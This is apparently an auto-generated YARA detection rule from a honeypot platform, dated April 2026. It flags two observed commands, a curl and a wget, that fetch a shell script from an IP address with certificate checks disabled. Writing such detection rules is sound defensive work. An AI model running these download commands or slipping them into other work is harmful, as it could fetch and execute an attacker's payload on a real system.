// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260407_1536
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-04-07"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "2"
    strings:
        $s0 = "curl -sk https://46.151.182.82/sh" ascii nocase
        $s1 = "wget --no-check-certificate -qO- https://46.151.182.82/sh" ascii nocase
    condition:
        any of them
}